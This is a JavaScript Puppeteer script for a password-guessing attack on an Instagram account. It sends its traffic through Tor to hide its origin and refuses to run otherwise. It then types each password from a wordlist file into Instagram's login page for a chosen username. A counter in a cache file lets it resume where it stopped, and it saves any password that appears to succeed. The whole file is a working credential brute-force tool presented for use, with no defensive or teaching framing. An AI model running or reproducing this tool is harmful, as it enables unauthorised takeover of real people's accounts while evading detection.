import * as puppeteer from 'puppeteer'
import { createInterface } from 'node:readline/promises'
import { createReadStream } from 'node:fs'
import { writeFile, readFile } from 'node:fs/promises'

(async () => {

    // set the ig username here
    const username = 'INSTAGRAM-USERNAME'

    const igValidPsw = (igPsw) => (igPsw.length > 5)

    // --------------------------------- TOR ----------------------------------
    try {

        const browser = await puppeteer.launch({
            args: ['--proxy-server=socks5://127.0.0.1:9050'],
            headless: 'new'
            // headless: false
        })

        const page = await browser.newPage()
        await page.goto('https://check.torproject.org/')


        const isUsingTor = await page.$eval('body', (el) =>
            el.innerHTML.includes('Congratulations. This browser is configured to use Tor')
        )

        if (!isUsingTor) {
            console.log('Not using Tor. Closing...')
            return await browser.close()
        }
        // now you can go anywhere you want

        // ---------------------------------- CACHE -------------------------------
        // restart from count in cache.json (set to zero to start with new file)
        const cacheStr = await readFile('./cache.json', 'utf-8')
        const jsonData = await JSON.parse(cacheStr)
        const bkCount = jsonData.count

        // ----------------------------------- PSW --------------------------------
        // Read stream from file
        const fileStream = await createReadStream('./psw.lst')

        // Read line by one manually with iterator
        const rl = createInterface({
            input: fileStream,
            crlfDelay: Infinity,
            outout: process.stdout
        })

        const it = rl[Symbol.asyncIterator]()

        let count = 0
        // First line of the file @LINE >>  { value: 'slabclimbing', done: false }
        let line = await it.next()

        // loop on all other lines
        while (!line.done) {

            count++

            if (igValidPsw(line.value) && count >= bkCount) {
                
                // @DEBUG
                // console.log(`@TEST (${count}) >> ${line.value}`)

                // ------------------------------ RUN -----------------------------
                await page.goto(
                    'https://www.instagram.com/accounts/login/',
                    {
                        waitUntil: 'networkidle0'
                    })

                
                    // await new Promise(r => setTimeout(r, 500)) TODO


                    // if cookie dialog is present > click deny all cookies
                    if ((await page.$('button._a9--._a9_1')) !== null) {
                        // Pause for 0.5 seconds, to see what's going on. TODO
                        // await new Promise(r => setTimeout(r, 500))

                        // deny cookie policy
                        // await page.click('button._a9--._a9_1')
                        await page.$eval('button._a9--._a9_1', el => el.click())
                    }

                    // fill the fields
                    await page.waitForSelector('input[name="username"]')
                    await page.type('input[name="username"]', username)
                    await page.type('input[name="password"]', line.value)
                
                    await page.$eval('button[type="submit"]', el => el.click())

                    // await new Promise(r => setTimeout(r, 500))  // TODO

                    // get the first that resolve
                    // waitForNavigation > auth ok the page will change
                    // waitForSelector > auth NOT red message displayed
                    //
                    // r is a CDPElementHandle
                    const r = await Promise.race([
                        page.waitForNavigation(),
                        page.waitForSelector('#slfErrorAlert')
                    ])

                    // check on URL
                    //
                    //  OK?     /challenge/action
                    // 
                    //  NO      /accounts/login/
                    const url = new URL(page.url())
                    // @DEBUG
                    // console.log('@PAGE-PATHNAME >> ', url.pathname)

                    // auth regex
                    const authRe = new RegExp('/accounts/login/*', 'g')

                    let data = {}

                    if (authRe.test(url.pathname)) {
                        // console.log('@AUTH-PATH >> ', url.pathname)

                        data = JSON.stringify({
                            count,
                        }, null, 2)

                        writeFile('./cache.json', data, (err) => {
                            if (err) throw err
                        })

                        
                    } else {
                        // @DEBUG
                        // console.log(`@OK-PATH  ${line.value}  >> `, url.pathname)

                        // update the cache.json with the (MAYBE) password
                        // we get an url different from /accounts/login

                        data = JSON.stringify({
                            count,
                            psw: line.value
                        }, null, 2)

                        await writeFile('./cache.json', data)
                        // close when all stuff is done
                        await browser.close()
                        process.exit()
                    }


            }

            line = await it.next()
        }

        // close when all stuff is done
        await browser.close()

    } catch (err) {
        console.log('@CATCH >> ', err.message)
    }

})()